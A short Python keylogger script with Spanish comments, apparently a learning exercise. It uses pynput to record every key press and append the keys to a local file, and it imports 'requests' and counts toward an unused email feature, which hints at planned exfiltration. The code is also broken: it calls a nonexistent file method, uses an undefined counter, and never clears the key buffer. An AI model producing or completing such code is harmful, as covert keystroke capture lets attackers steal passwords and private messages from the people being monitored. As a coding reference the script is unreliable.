from pynput.keyboard import Key, Listener

import requests

keys = []

count = 0

def write_file(keys):
  with open("salida.txt", "a") as file:
    for key in keys:
      # Convertimos key en un string y sustituimos las comillas por nada
      k = str(key).replace("'", "")
      file.write_file(k)


def on_press(key):
  global keys, count, count_email
  keys.append(key)
  print(f'Se presionó la tecla {key}') 

  count += 1
  count_email += 1

  if count >= 5:
    count = 0
    write_file(keys)

def on_release(key):
  if key == Key.esc:
    return False

# Creamos un método que aprovecha las dos funcunciones que 
# hicimos y los renombramos 'listener'

with Listener(on_press=on_press, on_release=on_release) as listener:
  # Le indicamos al método que todas las pulsaciones las va a detectar
  listener.join()